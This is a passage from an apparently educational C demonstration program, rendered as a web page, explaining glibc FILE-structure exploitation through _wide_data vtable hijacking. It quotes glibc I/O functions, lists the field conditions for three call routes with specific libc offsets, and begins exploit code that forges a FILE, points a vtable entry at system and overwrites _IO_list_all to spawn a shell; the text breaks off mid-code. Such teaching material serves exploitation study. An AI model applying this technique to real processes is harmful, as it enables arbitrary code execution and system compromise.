控制流判断条件，注意_flags在FILE结构体最开头，与binsh字符串重合，因此不能直接写&#x27;/bin/sh&#x27;，本程序写入的是&#x27;  sh&#x27;)\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;D. FILE-&gt;_flags &amp; 0x800 == 0 (_IO_wfile_overflow 控制流判断条件)\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;E. FILE-&gt;_wode_data-&gt;_IO_write_base == 0 (_IO_wfile_overflow 控制流判断条件，_IO_write_base偏移0x18)\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;F. FILE-&gt;_wide_data-&gt;_IO_buf_base == 0 (_IO_wdoallocbuf 控制流判断条件)\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;G. FILE-&gt;_flags &amp; 2 != 0 (_IO_wdoallocbuf 控制流判断条件)\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;H. FILE-&gt;_wide_data-&gt;_wide_vtable + 0x68 == 要执行的代码地址 (ALLOCATE函数指针偏移0x68)\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(WHITE, HIGHLIGHT, <span class="string">&quot;(2) _IO_wfile_underflow_mmap 路线\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;这个函数在IDA中原本是没有符号的，但通过对_IO_wdoallocbuf函数的引用分析可以定位其位置：0x860B0。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;同时可以发现该函数只有1个已有的_IO_jump_t引用，偏移为0x216000 (_IO_wfile_jumps_mmap)。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;看一下这个函数对我们的FILE结构体有什么要求。\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(BLUE, HIGHLIGHT, <span class="string">&quot;(/libio/wfileops.c, line 331)\n&quot;</span>);</span><br><span class="line">    printf_color(PURPLE, HIGHLIGHT,</span><br><span class="line">                 <span class="string">&quot;static wint_t\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;_IO_wfile_underflow_mmap (FILE *fp)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  struct _IO_codecvt *cd;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  const char *read_stop;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  if (&quot;</span> HIGHLIGHT_RED_HEAD <span class="string">&quot;__glibc_unlikely (fp-&gt;_flags &amp; _IO_NO_READS)&quot;</span> HIGHLIGHT_PURPLE_HEAD <span class="string">&quot;)    // _IO_NO_READS == 0x4\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      fp-&gt;_flags |= _IO_ERR_SEEN;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      __set_errno (EBADF);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      return WEOF;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    &#125;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  if (&quot;</span> HIGHLIGHT_RED_HEAD <span class="string">&quot;fp-&gt;_wide_data-&gt;_IO_read_ptr &lt; fp-&gt;_wide_data-&gt;_IO_read_end&quot;</span> HIGHLIGHT_PURPLE_HEAD <span class="string">&quot;)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    return *fp-&gt;_wide_data-&gt;_IO_read_ptr;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  cd = fp-&gt;_codecvt;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  /* Maybe there is something left in the external buffer.  */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  if (&quot;</span> HIGHLIGHT_RED_HEAD <span class="string">&quot;fp-&gt;_IO_read_ptr &gt;= fp-&gt;_IO_read_end\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      /* No.  But maybe the read buffer is not fully set up.  */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      &amp;&amp; _IO_file_underflow_mmap (fp) == EOF&quot;</span> HIGHLIGHT_PURPLE_HEAD <span class="string">&quot;)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    /* Nothing available.  _IO_file_underflow_mmap has set the EOF or error\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;       flags as appropriate.  */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    return WEOF;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  /* There is more in the external.  Convert it.  */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  read_stop = (const char *) fp-&gt;_IO_read_ptr;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  if (&quot;</span> HIGHLIGHT_GREEN_HEAD <span class="string">&quot;fp-&gt;_wide_data-&gt;_IO_buf_base == NULL&quot;</span> HIGHLIGHT_PURPLE_HEAD <span class="string">&quot;)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      /* Maybe we already have a push back pointer.  */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      if (&quot;</span> HIGHLIGHT_RED_HEAD <span class="string">&quot;fp-&gt;_wide_data-&gt;_IO_save_base != NULL&quot;</span> HIGHLIGHT_PURPLE_HEAD <span class="string">&quot;)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t&#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t  free (fp-&gt;_wide_data-&gt;_IO_save_base);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t  fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t&#125;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      &quot;</span> HIGHLIGHT_YELLOW_HEAD <span class="string">&quot;_IO_wdoallocbuf (fp);\n&quot;</span> HIGHLIGHT_PURPLE_HEAD</span><br><span class="line">                 <span class="string">&quot;    &#125;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  fp-&gt;_wide_data-&gt;_IO_last_state = fp-&gt;_wide_data-&gt;_IO_state;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  fp-&gt;_wide_data-&gt;_IO_read_base = fp-&gt;_wide_data-&gt;_IO_read_ptr =\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    fp-&gt;_wide_data-&gt;_IO_buf_base;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  __libio_codecvt_in (cd, &amp;fp-&gt;_wide_data-&gt;_IO_state,\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t      fp-&gt;_IO_read_ptr, fp-&gt;_IO_read_end,\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t      &amp;read_stop,\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t      fp-&gt;_wide_data-&gt;_IO_read_ptr,\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t      fp-&gt;_wide_data-&gt;_IO_buf_end,\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t      &amp;fp-&gt;_wide_data-&gt;_IO_read_end);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  fp-&gt;_IO_read_ptr = (char *) read_stop;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  /* If we managed to generate some text return the next character.  */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  if (fp-&gt;_wide_data-&gt;_IO_read_ptr &lt; fp-&gt;_wide_data-&gt;_IO_read_end)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    return *fp-&gt;_wide_data-&gt;_IO_read_ptr;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  /* There is some garbage at the end of the file.  */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  __set_errno (EILSEQ);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  fp-&gt;_flags |= _IO_ERR_SEEN;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  return WEOF;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#125;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;static wint_t\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;_IO_wfile_underflow_maybe_mmap (FILE *fp)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  /* This is the first read attempt.  Doing the underflow will choose mmap\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;     or vanilla operations and then punt to the chosen underflow routine.\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;     Then we can punt to ours.  */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  if (_IO_file_underflow_maybe_mmap (fp) == EOF)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    return WEOF;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  return _IO_WUNDERFLOW (fp);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#125;\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;其中也调用了_IO_wdoallocbuf函数。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;因此这条路径的限制条件为：\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;A. FILE-&gt;mode = 0 (_IO_flush_all_lockp 控制流判断条件)\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;B. FILE-&gt;_IO_write_ptr &gt; FILE-&gt;_IO_write_base (_IO_flush_all_lockp 控制流判断条件)\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;C. FILE-&gt;_flag &amp; 4 == 0 (_IO_wfile_underflow_mmap 控制流判断条件)\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;D. FILE-&gt;_wide_data-&gt;_IO_read_ptr &gt;= FILE-&gt;_wide_data-&gt;_IO_read_end (_IO_wfile_underflow_mmap 控制流判断条件)\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;E. FILE-&gt;_IO_read_ptr &lt; FILE-&gt;_IO_read_end (_IO_wfile_underflow_mmap 控制流判断条件)\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;F. FILE-&gt;_wide_data-&gt;_IO_buf_base == NULL (_IO_wfile_underflow_mmap 控制流判断条件)\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;G. FILE-&gt;_wide_data-&gt;_IO_save_base == NULL (_IO_wfile_underflow_mmap 控制流判断条件)\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;H. FILE-&gt;_wide_data-&gt;_IO_buf_base == 0 (_IO_wdoallocbuf 控制流判断条件)\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;I. FILE-&gt;_flags &amp; 2 != 0 (_IO_wdoallocbuf 控制流判断条件)\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;J. FILE-&gt;_wide_data-&gt;_wide_vtable + 0x68 == 要执行的代码地址 (ALLOCATE函数指针偏移0x68)\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(WHITE, HIGHLIGHT, <span class="string">&quot;(3) _IO_wdefault_xsgetn 路线\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;这条路线有一个关键的限制条件：在进入时rdx!=0。下面通过分析将会解释这个条件的来源。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;这个函数出现于4个_IO_jump_t结构体中，可以选择其一：\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, HIGHLIGHT, <span class="string">&quot;\t_IO_helper_jumps，偏移量0x215AC0\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, HIGHLIGHT, <span class="string">&quot;\t_IO_wmem_jumps，偏移量0x216180\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, HIGHLIGHT, <span class="string">&quot;\t_IO_wstr_jumps，偏移量0x215E80\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, HIGHLIGHT, <span class="string">&quot;\t_IO_wstrn_jumps，偏移量0x215DC0\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;不过需要注意的是，由于_IO_flush_all_lockp中调用的是OVERFLOW函数指针，因此需要加一个偏移才能使其调用_IO_wdefault_xsgetn。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;OVERFLOW函数指针的偏移为0x18，xsgetn的偏移为0x40，因此vtable的地址应该写入上述其中一个值+0x28。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;下面是_IO_wdefault_xsgetn函数的定义：\n&quot;</span>);</span><br><span class="line">    printf_color(BLUE, HIGHLIGHT, <span class="string">&quot;(/libio/wgenops.c, line 324)\n&quot;</span>);</span><br><span class="line">    printf_color(PURPLE, HIGHLIGHT,</span><br><span class="line">                 <span class="string">&quot;size_t\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;_IO_wdefault_xsgetn (FILE *fp, void *data, &quot;</span> HIGHLIGHT_YELLOW_HEAD <span class="string">&quot;size_t n&quot;</span> HIGHLIGHT_PURPLE_HEAD <span class="string">&quot;)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  &quot;</span> HIGHLIGHT_YELLOW_HEAD <span class="string">&quot;size_t more = n;\n&quot;</span> HIGHLIGHT_PURPLE_HEAD</span><br><span class="line">                 <span class="string">&quot;  wchar_t *s = (wchar_t*) data;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  for (;;)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      /* Data available. */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      &quot;</span> HIGHLIGHT_YELLOW_HEAD <span class="string">&quot;ssize_t count = (fp-&gt;_wide_data-&gt;_IO_read_end\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;                       - fp-&gt;_wide_data-&gt;_IO_read_ptr);\n&quot;</span> HIGHLIGHT_PURPLE_HEAD</span><br><span class="line">                 <span class="string">&quot;      if (&quot;</span> HIGHLIGHT_RED_HEAD <span class="string">&quot;count &gt; 0&quot;</span> HIGHLIGHT_PURPLE_HEAD <span class="string">&quot;)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t&#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t  if ((size_t) count &gt; more)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t    count = more;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t  if (count &gt; 20)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t    &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t      s = __wmempcpy (s, fp-&gt;_wide_data-&gt;_IO_read_ptr, count);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t      fp-&gt;_wide_data-&gt;_IO_read_ptr += count;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t    &#125;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t  else if (count &lt;= 0)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t    count = 0;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t  else\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t    &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t      wchar_t *p = fp-&gt;_wide_data-&gt;_IO_read_ptr;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t      int i = (int) count;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t      while (--i &gt;= 0)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t*s++ = *p++;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t      fp-&gt;_wide_data-&gt;_IO_read_ptr = p;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;            &#125;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;            more -= count;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;        &#125;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      if (&quot;</span> HIGHLIGHT_RED_HEAD <span class="string">&quot;more == 0&quot;</span> HIGHLIGHT_PURPLE_HEAD <span class="string">&quot; || &quot;</span> HIGHLIGHT_YELLOW_HEAD <span class="string">&quot;__wunderflow (fp) == WEOF)\n&quot;</span> HIGHLIGHT_PURPLE_HEAD</span><br><span class="line">                 <span class="string">&quot;\tbreak;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    &#125;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  return n - more;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#125;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;libc_hidden_def (_IO_wdefault_xsgetn)\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;从上面的代码就可以看出，我们为什么要让rdx!=0，这是为了使 more != 0。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;下面是__wunderflow函数的定义：\n&quot;</span>);</span><br><span class="line">    printf_color(BLUE, HIGHLIGHT, <span class="string">&quot;(/libio/wgenops.c, line 250)\n&quot;</span>);</span><br><span class="line">    printf_color(PURPLE, HIGHLIGHT,</span><br><span class="line">                 <span class="string">&quot;wint_t\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;__wunderflow (FILE *fp)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  if (&quot;</span> HIGHLIGHT_RED_HEAD <span class="string">&quot;fp-&gt;_mode &lt; 0 || (fp-&gt;_mode == 0 &amp;&amp; _IO_fwide (fp, 1) != 1))\n&quot;</span> HIGHLIGHT_PURPLE_HEAD</span><br><span class="line">                 <span class="string">&quot;    return WEOF;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  if (&quot;</span> HIGHLIGHT_RED_HEAD <span class="string">&quot;fp-&gt;_mode == 0&quot;</span> HIGHLIGHT_PURPLE_HEAD <span class="string">&quot;)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    _IO_fwide (fp, 1);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  if (&quot;</span> HIGHLIGHT_GREEN_HEAD <span class="string">&quot;_IO_in_put_mode (fp)&quot;</span> HIGHLIGHT_PURPLE_HEAD <span class="string">&quot;)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    if (&quot;</span> HIGHLIGHT_YELLOW_HEAD <span class="string">&quot;_IO_switch_to_wget_mode (fp) == EOF&quot;</span> HIGHLIGHT_PURPLE_HEAD <span class="string">&quot;)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      return WEOF;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  if (fp-&gt;_wide_data-&gt;_IO_read_ptr &lt; fp-&gt;_wide_data-&gt;_IO_read_end)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    return *fp-&gt;_wide_data-&gt;_IO_read_ptr;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  if (_IO_in_backup (fp))\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      _IO_switch_to_main_wget_area (fp);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      if (fp-&gt;_wide_data-&gt;_IO_read_ptr &lt; fp-&gt;_wide_data-&gt;_IO_read_end)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\treturn *fp-&gt;_wide_data-&gt;_IO_read_ptr;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    &#125;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  if (_IO_have_markers (fp))\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      if (save_for_wbackup (fp, fp-&gt;_wide_data-&gt;_IO_read_end))\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\treturn WEOF;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    &#125;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  else if (_IO_have_backup (fp))\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    _IO_free_wbackup_area (fp);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  return _IO_UNDERFLOW (fp);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#125;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;libc_hidden_def (__wunderflow)\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;其中有一个_IO_in_put_mode宏定义：&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;#define _IO_in_put_mode(_fp) ((_fp)-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) // _IO_CURRENTLY_PUTTING == 0x800\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;再来到_IO_switch_to_wget_mode函数：\n&quot;</span>);</span><br><span class="line">    printf_color(BLUE, HIGHLIGHT, <span class="string">&quot;(/libio/wgenops.c, line 390)\n&quot;</span>);</span><br><span class="line">    printf_color(PURPLE, HIGHLIGHT,</span><br><span class="line">                 <span class="string">&quot;int\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;_IO_switch_to_wget_mode (FILE *fp)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  if (&quot;</span> HIGHLIGHT_GREEN_HEAD <span class="string">&quot;fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base&quot;</span> HIGHLIGHT_PURPLE_HEAD <span class="string">&quot;)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    if ((wint_t)&quot;</span> HIGHLIGHT_YELLOW_HEAD <span class="string">&quot;_IO_WOVERFLOW (fp, WEOF)&quot;</span> HIGHLIGHT_PURPLE_HEAD <span class="string">&quot; == WEOF)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      return EOF;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  if (_IO_in_backup (fp))\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    fp-&gt;_wide_data-&gt;_IO_read_base = fp-&gt;_wide_data-&gt;_IO_backup_base;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  else\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      fp-&gt;_wide_data-&gt;_IO_read_base = fp-&gt;_wide_data-&gt;_IO_buf_base;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      if (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_read_end)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tfp-&gt;_wide_data-&gt;_IO_read_end = fp-&gt;_wide_data-&gt;_IO_write_ptr;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    &#125;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  fp-&gt;_wide_data-&gt;_IO_read_ptr = fp-&gt;_wide_data-&gt;_IO_write_ptr;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  fp-&gt;_wide_data-&gt;_IO_write_base = fp-&gt;_wide_data-&gt;_IO_write_ptr\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    = fp-&gt;_wide_data-&gt;_IO_write_end = fp-&gt;_wide_data-&gt;_IO_read_ptr;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  fp-&gt;_flags &amp;= ~_IO_CURRENTLY_PUTTING;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  return 0;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#125;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;libc_hidden_def (_IO_switch_to_wget_mode)\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;在这里调用WOVERFLOW函数指针。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;总结一下这条路径需要的构造条件：\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;A. FILE-&gt;_mode &gt; 0 (_IO_flush_all_lockp 控制流判断条件，__wunderflow 控制流判断条件)\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;B. FILE-&gt;_wide_data-&gt;_IO_write_ptr &gt; FILE-&gt;_wide_data-&gt;_IO_write_base (_IO_flush_all_lockp 控制流判断条件，_IO_switch_to_wget_mode 控制流判断条件)\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;C. rdx != 0 (_IO_wdefault_xsgetn 控制流判断条件)\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;D. FILE-&gt;_wide_data-&gt;_IO_read_end - FILE-&gt;_wide_data-&gt;_IO_read_ptr &lt;= 0 (_IO_wdefault_xsgetn 控制流判断条件)\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;E. FILE-&gt;_flags &amp; 0x800 != 0 (__wunderflow 控制流判断条件)\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;F. FILE-&gt;_wide_data-&gt;_wide_vtable + 0x18 == 要执行的代码地址 (OVERFLOW函数指针偏移0x18)\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> exploit_mode == 1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// (/libio/genops.c, line 701): fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span></span><br><span class="line">    fake_FILE-&gt;_mode = <span class="number">0</span>;</span><br><span class="line">    fake_FILE-&gt;_IO_write_ptr = (<span class="type">char</span>*)<span class="number">1</span>;</span><br><span class="line">    fake_FILE-&gt;_IO_write_base = (<span class="type">char</span>*)<span class="number">0</span>;</span><br><span class="line">    ((<span class="type">size_t</span>*)fake_FILE)[<span class="number">0xD8</span> / <span class="number">8</span>] = libc_base + <span class="number">0x2160C0</span>; <span class="comment">// vtable, 0x215F40, 0x216000</span></span><br><span class="line">    fake_FILE-&gt;_wide_data = fake_wide_data;</span><br><span class="line">    ((<span class="type">size_t</span>*)fake_FILE-&gt;_wide_data)[<span class="number">0xE0</span> / <span class="number">8</span>] = (<span class="type">size_t</span>)fake_vtable;   <span class="comment">// _wide_data-&gt;_wide_vtable</span></span><br><span class="line">    ((<span class="type">size_t</span>*)fake_FILE-&gt;_wide_data)[<span class="number">0x18</span> / <span class="number">8</span>] = <span class="number">0</span>;</span><br><span class="line">    fake_vtable[<span class="number">0x68</span> / <span class="number">8</span>] = (<span class="type">size_t</span>)system;     <span class="comment">// _IO_WDOALLOCATE调用的函数指针，偏移量可通过查看汇编获取</span></span><br><span class="line">    <span class="built_in">strcpy</span>((<span class="type">char</span>*)fake_FILE, binsh);</span><br><span class="line">    *(_IO_list_all) = (<span class="type">size_t</span>)fake_FILE;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">elif</span> exploit_mode == 2</span></span><br><span class="line"></span><br><span class="line">    fake_FILE-&gt;_mode = <span class="number">0</span>;</span><br><span class="line">    fake_FILE-&gt;_IO_write_ptr = (<span class="type">char</span>*)<span class="number">1</span>;</span><br><span class="line">    fake_FILE-&gt;_IO_write_base = (<span class="type">char</span>*)<span class="number">0</span>;</span><br><span class="line">    fake_FILE-&gt;_IO_read_end = (<span class="type">char</span>*)<span class="number">1</span>;</span><br><span class="line">    ((<span 